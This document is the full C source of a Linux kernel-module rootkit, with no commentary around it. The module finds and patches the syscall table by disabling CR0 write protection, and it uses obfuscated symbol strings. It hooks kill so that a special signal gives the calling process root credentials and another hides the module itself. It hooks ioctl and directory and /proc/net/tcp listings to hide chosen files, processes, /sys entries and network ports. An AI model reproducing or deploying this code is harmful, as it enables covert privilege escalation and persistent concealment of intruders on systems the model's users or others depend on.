#include <linux/cred.h>
#include <linux/dirent.h>
#include <linux/file.h>
#include <linux/fs.h>
#include <linux/init.h>
#include <linux/kallsyms.h>
#include <linux/kernel.h>
#include <linux/module.h>
#include <linux/mutex.h>
#include <linux/unistd.h>
#include <linux/sched.h>
#include <linux/slab.h>
#include <linux/string.h>
#include <linux/syscalls.h>
#include <linux/version.h> 
#include <linux/workqueue.h>
#include <asm/pgtable.h>
#include <asm/special_insns.h>
#include <asm/uaccess.h>
#include <linux/kdev_t.h>
#include <linux/types.h>
#include <linux/list.h>
#include <linux/proc_fs.h>
#include <net/tcp.h> 

#if LINUX_VERSION_CODE >= KERNEL_VERSION(3, 10, 0)
    #include <linux/proc_ns.h>
#else
    #include <linux/proc_fs.h>
#endif
#if LINUX_VERSION_CODE > KERNEL_VERSION(2, 6, 26)
    #include <linux/fdtable.h>
#endif

MODULE_LICENSE("GPL");
#define SIGFLIP 50
#define SIGROOT 51

#define COMMON_PATH "/"
#define PROC_PATH "/proc"
#define SYS_PATH "/sys"
#define TCP_IPV4_PATH "/proc/net/tcp"
#define MAX_SECRET_FILES 12
#define MAX_SECRET_DEVS 4
#define IOCTL_FILECMD 0xfffffffe
#define IOCTL_PORTHIDE 0xfffffffd
#define IOCTL_PORTUNHIDE 0xfffffffc
#define HIDE_FILE 1
#define UNHIDE_FILE 2
#define HIDE_PROC 3
#define UNHIDE_PROC 4
#define HIDE_SYS 5
#define UNHIDE_SYS 6
#define NEEDLE_LEN 6
#define TMPSZ 150


#define SYS_CALL_TABLE \
({ \
unsigned int *p = (unsigned int*)__builtin_alloca(16); \
 p[0] = 0x5f737973; \
 p[1] = 0x6c6c6163; \
 p[2] = 0x6261745f; \
 p[3] = 0x0000656c; \
 (char *)p; \
})

#define SYS_CLOSE \
({ \
unsigned int *p = (unsigned int*)__builtin_alloca(12); \
 p[0] = 0x5f737973; \
 p[1] = 0x736f6c63; \
 p[2] = 0x00000065; \
 (char *)p; \
})

bool hidden = false;
static struct list_head *mod_list;
static unsigned long *sct;

typedef int (*file_iterate) (struct file *filp, struct dir_context *ctx);
typedef int (*file_filldir) (struct dir_context *ctx, const char *name, int namlen, loff_t offset, u64 ino, unsigned d_type);

typedef int (*seq_file_show)(struct seq_file *m, void *v);

asmlinkage int (*org_kill)(pid_t pid, int sig);
asmlinkage int new_kill(pid_t pid, int sig);

asmlinkage long (*org_ioctl)(int fd, int cmd, long arg);
asmlinkage long new_ioctl(int fd, int cmd, long arg);

asmlinkage int (*org_seq_show)(struct seq_file *m, void *v);
asmlinkage int new_seq_show(struct seq_file *seq, void *v); 

void hook_file_op(const char *path, file_iterate new, file_iterate *old);
void hook_afinfo_seq_op(const char *path, seq_file_show new, seq_file_show *old);

void enable_write(void){
    write_cr0(read_cr0() & (~0x10000));
    return;
}

void disable_write(void){
    write_cr0(read_cr0() | 0x10000);
    return;
}

struct common_node{
    unsigned long hide_ino;
    struct list_head list;
};

LIST_HEAD(common_node_head);

struct list_head *common_node_pos;
struct list_head *tmp_common_node_pos;
struct common_node *tmp_common_node;
int common_node_add(unsigned long h_ino);
void common_node_delete(unsigned long h_ino);

int common_node_add(unsigned long h_ino){
    tmp_common_node = kmalloc(sizeof(struct common_node),GFP_KERNEL);
    tmp_common_node->hide_ino = h_ino;
    printk("add common ino: %lu\n", h_ino);
    list_add_tail(&(tmp_common_node->list), &common_node_head);
    return 0;
}

void common_node_delete(unsigned long h_ino){
    list_for_each_safe(common_node_pos, tmp_common_node_pos, &common_node_head){
        tmp_common_node = list_entry(common_node_pos,struct common_node,list);
        if (tmp_common_node->hide_ino == h_ino)
            {
                printk("delete common ino: %lu\n", h_ino);
                list_del(&(tmp_common_node->list));
                break;
            }
    }
    return;
}

asmlinkage int new_common_iterate(struct file *filp, struct dir_context *ctx);
file_iterate org_common_iterate;
asmlinkage int new_common_filldir(struct dir_context *ctx, const char *name, int namlen, loff_t offset, u64 ino, unsigned d_type);
file_filldir org_common_filldir;

struct proc_node{
    unsigned long hide_ino;
    struct list_head list;
};

LIST_HEAD(proc_node_head);

struct list_head *proc_node_pos;
struct list_head *tmp_proc_node_pos;
struct proc_node *tmp_proc_node;
int proc_node_add(unsigned long h_ino);
void proc_node_delete(unsigned long h_ino);

int proc_node_add(unsigned long h_ino){
    tmp_proc_node = kmalloc(sizeof(struct proc_node),GFP_KERNEL);
    tmp_proc_node->hide_ino = h_ino;
    printk("add proc ino: %lu\n", h_ino);
    list_add_tail(&(tmp_proc_node->list), &proc_node_head);
    return 0;
}

void proc_node_delete(unsigned long h_ino){
    list_for_each_safe(proc_node_pos, tmp_proc_node_pos, &proc_node_head){
        tmp_proc_node = list_entry(proc_node_pos,struct proc_node,list);
        if (tmp_proc_node->hide_ino == h_ino)
            {
                printk("delete proc ino: %lu\n", h_ino);
                list_del(&(tmp_proc_node->list));
                break;
            }
    }
    return;
}

asmlinkage int new_proc_iterate(struct file *filp, struct dir_context *ctx);
file_iterate org_proc_iterate;
asmlinkage int new_proc_filldir(struct dir_context *ctx, const char *name, int namlen, loff_t offset, u64 ino, unsigned d_type);
file_filldir org_proc_filldir;

struct sys_node{
    unsigned long hide_ino;
    struct list_head list;
};

LIST_HEAD(sys_node_head);

struct list_head *sys_node_pos;
struct list_head *tmp_sys_node_pos;
struct sys_node *tmp_sys_node;
int sys_node_add(unsigned long h_ino);
void sys_node_delete(unsigned long h_ino);

int sys_node_add(unsigned long h_ino){
    tmp_sys_node = kmalloc(sizeof(struct sys_node),GFP_KERNEL);
    tmp_sys_node->hide_ino = h_ino;
    printk("add sys ino: %lu\n", h_ino);
    list_add_tail(&(tmp_sys_node->list), &sys_node_head);
    return 0;
}

void sys_node_delete(unsigned long h_ino){
    list_for_each_safe(sys_node_pos, tmp_sys_node_pos, &sys_node_head){
        tmp_sys_node = list_entry(sys_node_pos,struct sys_node,list);
        if (tmp_sys_node->hide_ino == h_ino)
            {
                printk("delete sys ino: %lu\n", h_ino);
                list_del(&(tmp_sys_node->list));
                break;
            }
    }
    return;
}

asmlinkage int new_sys_iterate(struct file *filp, struct dir_context *ctx);
file_iterate org_sys_iterate;
asmlinkage int new_sys_filldir(struct dir_context *ctx, const char *name, int namlen, loff_t offset, u64 ino, unsigned d_type);
file_filldir org_sys_filldir;

struct port_node{
    long port;
    struct list_head list;
};

LIST_HEAD(port_node_head);

struct list_head *port_node_pos;
struct list_head *tmp_port_node_pos;
struct port_node *tmp_port_node;
int port_node_add(long port);
void port_node_delete(long port);

int port_node_add(long port){
    tmp_port_node = kmalloc(sizeof(struct port_node),GFP_KERNEL);
    tmp_port_node->port = port;
    printk("add port: %l\n", port);
    list_add_tail(&(tmp_port_node->list), &port_node_head);
    return 0;
}

void port_node_delete(long port){
    list_for_each_safe(port_node_pos, tmp_port_node_pos, &port_node_head){
        tmp_port_node = list_entry(port_node_pos,struct port_node,list);
        if (tmp_port_node->port == port)
            {
                printk("delete port: %l\n", port);
                list_del(&(tmp_port_node->list));
                break;
            }
    }
    return;
}

struct ksym {
    char *name;
    unsigned long addr;
};

int find_ksym(void *data, const char *name, struct module *module, unsigned long address) {
    struct ksym *ksym = (struct ksym *)data;
    char *target = ksym->name;

    if (strncmp(target, name, KSYM_NAME_LEN) == 0) {
        ksym->addr = address;
        return 1;
    }

    return 0;
}

unsigned long get_symbol(char *name) {
    unsigned long symbol = 0;
    struct ksym ksym;

    ksym.name = name;
    ksym.addr = 0;
    kallsyms_on_each_symbol(&find_ksym, &ksym);
    symbol = ksym.addr;

    return symbol;
}

void *memmem(const void *haystack, size_t haystack_size, const void *needle, size_t needle_size) {
        char *p;

        for(p = (char *)haystack; p <= ((char *)haystack - needle_size + haystack_size); p++) {
            if(memcmp(p, needle, needle_size) == 0) return (void *)p;
        }
        return NULL;
}

#ifdef __x86_64__

unsigned long *find_sys_call_table(void) {
    unsigned long sct_off = 0;
        unsigned char code[512];
        char **p;

        rdmsrl(MSR_LSTAR, sct_off);
        memcpy(code, (void *)sct_off, sizeof(code));

        p = (char **)memmem(code, sizeof(code), "\xff\x14\xc5", 3);
  
        if(p) {
            unsigned long *table = *(unsigned long **)((char *)p + 3);
            table = (unsigned long *)(((unsigned long)table & 0xffffffff) | 0xffffffff00000000);
            return table;
        }
        return NULL;
}

#else

struct {
    unsigned short limit;
    unsigned long base;
} __attribute__ ((packed))idtr;

struct {
    unsigned short off1;
    unsigned short sel;
        unsigned char none, flags;
        unsigned short off2;
} __attribute__ ((packed))idt;

unsigned long *find_sys_call_table(void) {
        char **p;
        unsigned long sct_off = 0;
        unsigned char code[255];

        asm("sidt %0":"=m" (idtr));
        memcpy(&idt, (void *)(idtr.base + 8 * 0x80), sizeof(idt));
        sct_off = (idt.off2 << 16) | idt.off1;
        memcpy(code, (void *)sct_off, sizeof(code));

        p = (char **)memmem(code, sizeof(code), "\xff\x14\x85", 3);

        if(p) return *(unsigned long **)((char *)p + 3);
        else return NULL;
}

#endif

unsigned long *generic_find_sys_call_table(void){
    unsigned long *syscall_table;
    unsigned long _sys_close;
    unsigned long int i;

#if LINUX_VERSION_CODE < KERNEL_VERSION(4, 17, 0)
    _sys_close = get_symbol(SYS_CLOSE);
#endif

    for (i = PAGE_OFFSET; i < ULONG_MAX; i += sizeof(void *)) {
        syscall_table = (unsigned long *)i;

#if LINUX_VERSION_CODE < KERNEL_VERSION(4, 17, 0)
        if (syscall_table[__NR_close] == (unsigned long)sys_close)
#else 
        if (syscall_table[__NR_close] == (unsigned long)_sys_close)
#endif
            return syscall_table;
    }
    return NULL;
}

void modhide(void) {
    if(hidden) return;

    while(!mutex_trylock(&module_mutex)) cpu_relax();
    mod_list = THIS_MODULE->list.prev;
    list_del(&THIS_MODULE->list);
    kfree(THIS_MODULE->sect_attrs);
    THIS_MODULE->sect_attrs = NULL;
    mutex_unlock(&module_mutex);
    hidden = true;
}

void modshow(void) {
    if(!hidden) return;
    while(!mutex_trylock(&module_mutex)) cpu_relax();
    list_add(&THIS_MODULE->list, mod_list);
    mutex_unlock(&module_mutex);
    hidden = false;
}

asmlinkage int new_kill(pid_t pid, int sig){
    switch(sig) {
        case SIGFLIP:
            if(hidden) modshow();
            else modhide();
            break;
        case SIGROOT:
    #if LINUX_VERSION_CODE < KERNEL_VERSION(2, 6, 29)
            current->uid   = 0;
            current->suid  = 0;
            current->euid  = 0;
            current->gid   = 0;
            current->egid  = 0;
            current->fsuid = 0;
            current->fsgid = 0;
            cap_set_full(current->cap_effective);
            cap_set_full(current->cap_inheritable);
            cap_set_full(current->cap_permitted);
    #else
            commit_creds(prepare_kernel_cred(0));
    #endif
            break;
        default:
            return org_kill(pid, sig);
    }
    return 0;
}

asmlinkage long new_ioctl(int fd, int cmd, long arg)
{
    int ret=0;
    struct inode *inode;
    struct dentry *entry;
    struct file *file;

    if(cmd != IOCTL_FILECMD && cmd != IOCTL_PORTHIDE && cmd != IOCTL_PORTUNHIDE)
    {
        return (*org_ioctl)(fd, cmd, arg);
    }

    if(cmd == IOCTL_PORTHIDE) {
        port_node_add(arg);
        return ret;
    }

    if(cmd == IOCTL_PORTUNHIDE) {
        port_node_delete(arg);
        return ret;
    }

    file = fget(fd);
    entry =file->f_path.dentry;
    inode = entry->d_inode;

    switch(arg)
    {
        case HIDE_FILE:
	    {
            common_node_add(inode->i_ino);
        }
	    break;
	
        case UNHIDE_FILE:
	    {
            common_node_delete(inode->i_ino);
        }
	    break;

        case HIDE_PROC:
	    {
            proc_node_add(inode->i_ino);
        }
	    break;
	
        case UNHIDE_PROC:
	    {
            proc_node_delete(inode->i_ino);
        }
	    break;

        case HIDE_SYS:
	    {
            sys_node_add(inode->i_ino);
        }
	    break;
	
        case UNHIDE_SYS:
	    {
            sys_node_delete(inode->i_ino);
        }
	    break;
	
        default:
	        return -EINVAL;
    }
    return ret;
}

void hook_file_op(const char *path, file_iterate new, file_iterate *old) {
    struct file *filp;
    struct file_operations *f_op;
    printk("Opening the path: %s\n", path);
    filp = filp_open(path, O_RDONLY, 0);
    if (IS_ERR(filp)) {
        old = NULL;
    } else {
        f_op = (struct file_operations *)filp->f_op;
        *(file_iterate *)old = f_op->iterate;
        enable_write();
        f_op->iterate = new;
        disable_write();
    }
}
//file hide

asmlinkage int new_common_iterate(struct file *filp, struct dir_context *ctx)
{
    org_common_filldir = ctx->actor;
    enable_write();
    *(filldir_t *)&ctx->actor = new_common_filldir;
    disable_write();
    return org_common_iterate(filp, ctx);
}
asmlinkage int new_common_filldir(struct dir_context *ctx, const char *name, int namlen, loff_t offset, u64 ino, unsigned d_type)
{
    unsigned long d_ino;
    d_ino = ino;
    list_for_each(common_node_pos, &common_node_head){
        tmp_common_node = list_entry(common_node_pos,struct common_node,list);
        if(d_ino == tmp_common_node->hide_ino){
            return 0;
        }
    }
    return org_common_filldir(ctx, name, namlen, offset, ino, d_type);
}
asmlinkage int new_proc_iterate(struct file *filp, struct dir_context *ctx)
{
    org_proc_filldir = ctx->actor;
    enable_write();
    *(filldir_t *)&ctx->actor = new_proc_filldir;
    disable_write();
    return org_proc_iterate(filp, ctx);
}
asmlinkage int new_proc_filldir(struct dir_context *ctx, const char *name, int namlen, loff_t offset, u64 ino, unsigned d_type)
{
    unsigned long d_ino;
    d_ino = ino;
    list_for_each(proc_node_pos, &proc_node_head){
        tmp_proc_node = list_entry(proc_node_pos,struct proc_node,list);
        if(d_ino == tmp_proc_node->hide_ino){
            return 0;
        }
    }
    return org_proc_filldir(ctx, name, namlen, offset, ino, d_type);
}
asmlinkage int new_sys_iterate(struct file *filp, struct dir_context *ctx)
{
    org_sys_filldir = ctx->actor;
    enable_write();
    *(filldir_t *)&ctx->actor = new_sys_filldir;
    disable_write();
    return org_sys_iterate(filp, ctx);
}
asmlinkage int new_sys_filldir(struct dir_context *ctx, const char *name, int namlen, loff_t offset, u64 ino, unsigned d_type)
{
    unsigned long d_ino;
    d_ino = ino;
    list_for_each(sys_node_pos, &sys_node_head){
        tmp_sys_node = list_entry(sys_node_pos,struct sys_node,list);
        if(d_ino == tmp_sys_node->hide_ino){
            return 0;
        }
    }
    return org_sys_filldir(ctx, name, namlen, offset, ino, d_type);
}

void display_iterate(const char* path){
    struct file *f;
    f = filp_open(path, O_RDONLY, 0);
    struct file_operations *f_op;
    f_op = (struct file_operations *)f->f_op;
    printk("%s iterate is %p\n", path, f_op->iterate);
    return;
}

void hook_afinfo_seq_op(const char *path, seq_file_show new, seq_file_show *old) {
    struct file *filp;                                      
    struct tcp_seq_afinfo *afinfo;                                     
    filp = filp_open(path, O_RDONLY, 0);                    
    if (IS_ERR(filp)) {                  
        old = NULL;                                         
    }                                                        
    afinfo = PDE_DATA(filp->f_path.dentry->d_inode);
    *(seq_file_show *)old = afinfo->seq_ops.show;
    enable_write();
    afinfo->seq_ops.show = new;
    disable_write();
    filp_close(filp, 0);
}

int new_seq_show(struct seq_file *seq, void *v) {
    int ret=0;
    char needle[NEEDLE_LEN];
    ret = org_seq_show(seq, v);
    list_for_each(port_node_pos, &port_node_head){
        tmp_port_node = list_entry(port_node_pos,struct port_node,list);
        snprintf(needle, NEEDLE_LEN, ":%04X", tmp_port_node->port);
        if (strnstr(seq->buf + seq->count - TMPSZ, needle, TMPSZ)) {
            seq->count -= TMPSZ;
            break;
        }
    }
    return ret;
}

static int lkm_init(void)
{
    printk("rootkit module loaded\n");
    //INIT_LIST_HEAD(pathnode_head);
    sct = (unsigned long *)find_sys_call_table();
    if(!sct) sct = (unsigned long *)get_symbol(SYS_CALL_TABLE);
    if(!sct) sct = (unsigned long *)generic_find_sys_call_table();          
    if(!sct) return -1;
    //obtain syscall addr
    org_kill = (void *)sct[__NR_kill];
    org_ioctl = (void *)sct[__NR_ioctl];
    //save origin kill addr
    hook_file_op(COMMON_PATH, new_common_iterate, &org_common_iterate);
    hook_file_op(PROC_PATH, new_proc_iterate, &org_proc_iterate);
    hook_file_op(SYS_PATH, new_sys_iterate, &org_sys_iterate);
    hook_afinfo_seq_op(TCP_IPV4_PATH, new_seq_show, &org_seq_show);
    enable_write();
    //disable write protect
    sct[__NR_kill] = (unsigned long)new_kill;
    sct[__NR_ioctl] = (unsigned long)new_ioctl;
    //hook kill 
    disable_write();
    //enable write protect
    return 0;    
}
 
static void lkm_exit(void)
{
    if(org_kill){
        enable_write();
        sct[__NR_kill] = (unsigned long)org_kill;
        disable_write();
    }
    if(org_ioctl){
        enable_write();
        sct[__NR_ioctl] = (unsigned long)org_ioctl;
        disable_write();
    }
    if (org_common_iterate) {
        void *dummy;
        hook_file_op(COMMON_PATH, org_common_iterate, &dummy);
        list_for_each_safe(common_node_pos, tmp_common_node_pos, &common_node_head) {
            tmp_common_node = list_entry(common_node_pos,struct common_node,list);
            list_del(&(tmp_common_node->list));
        }
    }
    if (org_proc_iterate) {
        void *dummy;
        hook_file_op(PROC_PATH, org_proc_iterate, &dummy);
        list_for_each_safe(proc_node_pos, tmp_proc_node_pos, &proc_node_head) {
            tmp_proc_node = list_entry(proc_node_pos,struct proc_node,list);
            list_del(&(tmp_proc_node->list));
        }
    }
    if (org_sys_iterate) {
        void *dummy;
        hook_file_op(SYS_PATH, org_sys_iterate, &dummy);
        list_for_each_safe(sys_node_pos, tmp_sys_node_pos, &sys_node_head) {
            tmp_sys_node = list_entry(sys_node_pos,struct sys_node,list);
            list_del(&(tmp_sys_node->list));
        }
    }
    if (org_seq_show) {
        void *dummy;
        hook_afinfo_seq_op(TCP_IPV4_PATH, org_seq_show, &dummy);
        list_for_each_safe(port_node_pos, tmp_port_node_pos, &port_node_head) {
            tmp_port_node = list_entry(port_node_pos,struct port_node,list);
            list_del(&(tmp_port_node->list));
        }
    }
    printk("rootkit module removed\n");
}
 
module_init(lkm_init);
module_exit(lkm_exit);
